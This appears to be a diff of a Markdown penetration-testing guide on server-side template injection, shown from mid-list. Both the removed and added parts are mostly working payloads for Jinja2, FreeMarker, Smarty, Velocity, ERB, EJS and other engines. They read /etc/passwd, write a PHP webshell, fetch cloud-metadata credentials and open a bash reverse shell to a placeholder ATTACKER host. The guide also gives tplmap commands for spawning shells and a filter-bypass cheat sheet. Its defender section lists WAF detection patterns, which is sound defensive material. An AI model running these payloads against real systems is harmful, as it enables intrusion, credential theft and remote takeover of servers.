-  - RCE (via `__subclasses__`): `{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }}` (Find `subprocess.Popen` index, e.g., `396`)
-  - RCE (Common - via `__globals__`): `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`
-  - RCE (via `request` object - `__globals__`): `{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}`
-  - RCE (via `config` object - `__globals__`): `{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}`
-  - RCE (Alternative via `__globals__` search): `{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}` (Search for a class with `_module` attribute)
-  - RCE (via `config` and `import_string`): `{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}`
-  - RCE (via `request` and hex/brackets bypass): `{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}`
-  - Write File (via `__subclasses__`): `{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evil', 'w').write('hello') }}` (Index varies)
-  - Write Evil Config & RCE:
-    ```python
-    # Write config
-    {{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
-    # Load config
-    {{ config.from_pyfile('/tmp/evilconfig.cfg') }}
-    # Execute
-    {{ config['RUNCMD']('id',shell=True) }}
-    ```
-  - Avoid HTML Encoding: `{{'<script>alert(1)</script>'|safe}}`
-  - Loop: `{%raw %}{% for c in [1,2,3] %}{{ c,c,c }}{% endfor %}{% endraw %}`
-- FreeMarker (Java):
-  - RCE: `<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }`
-  - RCE: `${"freemarker.template.utility.Execute"?new()("id")}`
-  - File Read: `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}` (May require adjustments)
-  - Info: `${class.getResource("").getPath()}`, `${T(java.lang.System).getenv()}`
-- Smarty (PHP):
-  - `{$smarty.version}`
-  - `{php}echo `id`;{/php}` (If PHP tag enabled)
-  - `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}` (Write webshell)
-  - `{{7*7}}`, `{{7*'7'}}`
-  - `{{dump(app)}}` (Symfony)
-  - `"{{'/etc/passwd'|file_excerpt(1,30)}}"@` (Twig)
-- Velocity (Java):
-  - `#set($str=$class.inspect("java.lang.String").type)`
-  - `#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))`
-  - `$ex.waitFor()`
-  - `#set($out=$ex.getInputStream()) ... #foreach ... $str.valueOf($chr.toChars($out.read())) ... #end` (Read command output)
-- Ruby (ERB, Slim):
-  - `<%= system("whoami") %>`
-  - `<%= Dir.entries('/') %>`
-  - `<%= File.open('/etc/passwd').read %>`
-- Node.js (Various engines):
-  - `{{this.constructor.constructor('return process.mainModule.require("child_process").execSync("id")')()}}`
-  - Payloads often involve traversing prototypes (`this.__proto__`) to reach `constructor` and eventually `Function` or `require`. See PayloadAllTheThings / Hacker Recipes for detailed Node examples.
-- ASP/.NET (Razor, etc.):
-  - `@(1+2)` -> `3`
-  - `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
-  - `<%= CreateObject("Wscript.Shell").exec("cmd /c whoami").StdOut.ReadAll() %>` (Classic ASP)
-- Perl (Template Toolkit):
-  - `[% PERL %] ... perl code ... [% END %]`
-  - `<%= perl code %>` or `<% perl code %>` (Depending on config)
-- Go (`text/template`):
-  - Potentially dangerous if methods allowing command execution are exposed to the template: `{{ .System "ls" }}`
-  - `html/template` is generally safer against XSS but might still leak info if not used carefully.
+```javascript
+// EJS - when user input reaches template compilation
+<%= global.process.mainModule.require('child_process').execSync('id').toString() %>
 
-### Comprehensive Payloads
+// EJS - via constructor chain
+<%= this.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')() %>
 
-- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
-- [PayloadBox - SSTI](https://github.com/payloadbox/ssti-payloadsb/ssti-server-side-template-injection/index.html)
+// Pug/Jade - code injection
+- var x = global.process.mainModule.require('child_process').execSync('id').toString()
+p= x
 
-## Chaining and Escalation
+// Nunjucks - reaching require through global
+{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}
+```
 
-SSTI often leads directly to RCE, but can also be used for:
+### Rails / ERB (Ruby)
 
-- **RCE:** Primary goal, gain shell access.
-- **File Exfiltration:** Read sensitive files (`/etc/passwd`, `web.config`, source code, credentials).
-- **Information Disclosure:** Dump environment variables, application configuration (`{{config}}`, `{{settings}}`), object properties, internal network paths.
-- **Internal Network Access:** Use RCE to pivot, scan internal networks, or access internal services.
-- **Privilege Escalation:** Combine RCE with local exploits if the web server runs with elevated privileges.
-- **Data Exfiltration:** Send internal data to an attacker-controlled server (e.g., via HTTP requests or DNS exfiltration from within the template code).
-- **SSRF pivot:** Some engines permit URL‑fetch filters (`{{''|fetch('http://...')}}`); leverage SSTI to query cloud‑metadata endpoints.
+```ruby
+# Standard ERB injection
+<%= `id` %>
+<%= system('id') %>
 
-## Remediation Recommendations
+# Via Object#send for filter bypass
+<%= ''.class.class.methods.grep(/new/).first %>
+<%= Kernel.send(:system, 'id') %>
 
-- Never Render User Input Directly: The most critical step. Treat user input as data, not code.
-- Use Safe Templating Practices:
-  - Pass user data into templates using dedicated template variables (e.g., `render_template('page.html', user_data=user_input)`).
-  - Use logic-less templates if possible.
-- Sanitize and Validate: If rendering user input is unavoidable (e.g., CMS), rigorously sanitize it. Remove or escape all template syntax characters (`{`, `}`, `$`, `%`, `<`, `>`, etc.). Use allow-lists for safe HTML if needed.
-- Use Sandboxed Environments: Configure the template engine's sandbox if available and effective for the specific engine. Be aware that sandboxes can often be bypassed.
-- Choose Safer Engines: Prefer engines designed for security, like Go's `html/template` over `text/template` for HTML output, as it provides context-aware auto-escaping.
-- Principle of Least Privilege: Run the web application process with minimal privileges.
-- Input Validation: Validate input against expected formats (e.g., email, number) before it reaches the template layer.
-- Patch management: track and apply security updates for template engines (see Recent CVEs).
-- Harden runtime: enable seccomp/AppArmor or gVisor so that even a successful RCE has minimal kernel attack surface.
-- CI guardrails: block usage of dangerous APIs (e.g., `render_template_string`, `Template.compile`, `eval` filters) via linters/semgrep; add approve‑list of safe helpers
-- For Node: disable `with` in EJS, avoid `compileDebug`, and run with `vm` sandbox only when fully locked down (no `require` or `Function` reachable)
+# Accessing Rails secrets
+<%= Rails.application.credentials.secret_key_base %>
+<%= Rails.application.secrets %>
+```
 
+---
+
+## Chaining SSTI to Higher Impact
+
+### SSTI to SSRF
+
+Use template engine capabilities to make server-side HTTP requests, reaching internal
+services and cloud metadata endpoints.
+
+```python
+# Jinja2 - SSRF via urllib (if available in subclasses)
+{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('http://169.254.169.254/latest/meta-data/iam/security-credentials/').read() }}
+
+# Twig - SSRF via file_get_contents
+{{ '/proc/net/tcp'|file_excerpt(1,100) }}
+
+# Freemarker - SSRF via URL include
+<#include "http://169.254.169.254/latest/meta-data/">
+
+# Thymeleaf/SpEL - SSRF via URL class
+${T(java.net.URI).create('http://169.254.169.254/latest/meta-data/').toURL().openStream()}
+```
+
+### SSTI to File Read
+
+```python
+# Jinja2 - read files via file subclass
+{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
+
+# Freemarker - include directive
+<#include "/etc/passwd">
+
+# ERB - File.read
+<%= File.read('/etc/passwd') %>
+
+# Mako - direct open
+<% print(open('/etc/passwd').read()) %>
+```
+
+### SSTI to Full RCE
+
+Once you have code execution through any engine, escalate to a proper reverse shell
+for interactive access.
+
+```bash
+# Generate a reverse shell payload and deliver via SSTI
+# Jinja2 reverse shell:
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"').read() }}
+
+# For Java engines (Freemarker, Velocity, Pebble, Thymeleaf):
+${"freemarker.template.utility.Execute"?new()("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}")}
+```
+
+---
+
+## Automated Exploitation with tplmap
+
+tplmap automates SSTI detection and exploitation across multiple engines. Use it for
+initial discovery, then switch to manual payloads for complex scenarios.
+
+```bash
+# Basic scan
+python tplmap.py -u 'http://target.com/page?name=test'
+
+# Scan with POST data
+python tplmap.py -u 'http://target.com/page' -d 'name=test'
+
+# Scan specific parameter in URL
+python tplmap.py -u 'http://target.com/page?name=test*'  # asterisk marks injection point
+
+# Force a specific engine
+python tplmap.py -u 'http://target.com/page?name=test' -e jinja2
+
+# Execute OS commands
+python tplmap.py -u 'http://target.com/page?name=test' --os-cmd 'id'
+
+# Spawn an interactive shell
+python tplmap.py -u 'http://target.com/page?name=test' --os-shell
+
+# File read / write
+python tplmap.py -u 'http://target.com/page?name=test' --download /etc/passwd ./passwd
+python tplmap.py -u 'http://target.com/page?name=test' --upload ./shell.php /var/www/html/shell.php
+
+# SSTImap (maintained fork with additional engines)
+python3 sstimap.py -u 'http://target.com/page?name=test' -s    # scan mode
+python3 sstimap.py -u 'http://target.com/page?name=test' -S    # interactive shell
+
+# TInjA (template injection analyzer)
+tinja url -u 'http://target.com/page?name=test'
+tinja url -u 'http://target.com/page?name=test' -e jinja2 --cmd 'id'
+```
+
+---
+
+## Detection / Defender View
+
+Defenders can detect and prevent SSTI at multiple layers.
+
+**Code-level prevention:**
+- Never concatenate user input into template strings. Always pass data as template variables.
+- Block dangerous APIs at the linter level: `render_template_string`, `Template()` with user input, `compile` with user input.
+- Use semgrep or CodeQL SSTI rule packs in CI pipelines to catch unsafe patterns before deployment.
+
+**Runtime detection signals:**
+- Template error messages in HTTP responses (stack traces mentioning Jinja2, Twig, Freemarker).
+- Requests containing template metacharacters: `{{`, `${`, `<%`, `{%`, `#{`, `*{`.
+- Requests with MRO traversal patterns: `__class__`, `__mro__`, `__subclasses__`, `__globals__`, `__builtins__`.
+- Requests with Java reflection patterns: `getRuntime`, `exec(`, `ProcessBuilder`, `forName`.
+- DNS queries to unexpected external domains from application servers (OOB exfiltration).
+- Unusual process spawning from web server processes (shell, python, curl).
+
+**WAF rules:**
+- Block or alert on `__class__`, `__mro__`, `__subclasses__`, `__globals__`, `__import__` in request parameters.
+- Block `T(java.lang.Runtime)`, `getRuntime()`, `ProcessBuilder` in request parameters.
+- Block `{%`, `{{`, `${`, `<%=` in contexts where template syntax is not expected.
+- Beware of bypass via encoding; decode before inspection.
+
+**Sandboxing:**
+- Enable template engine sandboxing where available (Jinja2 SandboxedEnvironment, Freemarker template security manager).
+- Run application processes with minimal OS privileges and seccomp/AppArmor profiles.
+- Use `html/template` over `text/template` in Go applications.
+- Disable `{php}` tags in Smarty; disable debug compilation in EJS; restrict SpEL in Thymeleaf.
+
+---
+
+## Engagement Cheatsheet
+
+```text
+ENGINE          DETECT                    INFO DISCLOSURE           RCE PAYLOAD
+------------------------------------------------------------------------------------------
+Jinja2          {{7*'7'}}=7777777         {{config}}                {{self.__init__.__globals__.__builtins__
+                                                                      .__import__('os').popen('CMD').read()}}
+
+Twig 1.x        {{7*7}}=49               {{_self.env}}             {{_self.env.registerUndefinedFilterCallback
+                                                                      ("exec")}}{{_self.env.getFilter("CMD")}}
+
+Twig 3.x        {{7*7}}=49               {{app.request.server}}    {{['CMD']|map('system')}}
+
+Freemarker      ${7*7}=49                ${.data_model}            ${"freemarker.template.utility.Execute"
+                                                                      ?new()("CMD")}
+
+Velocity        $class.type              #set($x=$class.inspect    #set($rt=$class.inspect("java.lang
+                                           ("java.lang.System"))      .Runtime").type.getRuntime().exec("CMD"))
+
+Pebble          {{7*7}}=49               {{beans}}                 See beans/Runtime chain above
+
+Smarty          {$smarty.version}         {$smarty.template}        {system('CMD')} or math equation abuse
+
+Mako            ${7*7}=49                ${self.module.__name__}   ${self.module.cache.util.os
+                                                                      .popen('CMD').read()}
+
+ERB             <%=7*7%>=49              <%=ENV%>                  <%=system('CMD')%>
+
+Thymeleaf       ${T(Math).PI}=3.14...    ${@environment}           ${T(java.lang.Runtime).getRuntime()
+                                                                      .exec('CMD')}
+
+Handlebars      {{this}}=object dump     {{@root}}                 Requires proto pollution or unsafe helpers
+
+EJS             <%=7*7%>=49              <%=process.env%>          <%=global.process.mainModule.require(
+                                                                      'child_process').execSync('CMD')%>
+
+Nunjucks        {{7*7}}=49               {{range.constructor}}     {{range.constructor("return global.process
+                                                                      .mainModule.require('child_process')
+                                                                      .execSync('CMD')")()}}
+```
+
+```text
+BYPASS QUICK REFERENCE
+  Dot blocked:        |attr('name') or ['name']
+  Underscore blocked: \x5f (hex) or request.args
+  Quotes blocked:     request.args.param or chr() construction
+  Brackets blocked:   |attr() chains with |attr('__getitem__')
+  Keywords blocked:   string concatenation ('o'+'s') or ~ operator
+  WAF blocking {{:    double-encode %257B%257B or HPP
+  Blind context:      time delay, OOB DNS, error-based inference
+```
+
+---
+
+## Key References
+
+- PortSwigger SSTI Research: https://portswigger.net/research/server-side-template-injection
+- PayloadsAllTheThings SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+- HackTricks SSTI: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
+- tplmap: https://github.com/epinna/tplmap
+- SSTImap: https://github.com/vladko312/SSTImap
+- TInjA: https://github.com/Hackmanit/TInjA
+- Jinja2 Documentation (sandbox): https://jinja.palletsprojects.com/en/3.1.x/sandbox/
+- Spring SpEL Documentation: https://docs.spring.io/spring-framework/reference/core/expressions.html
+- Freemarker Security: https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security
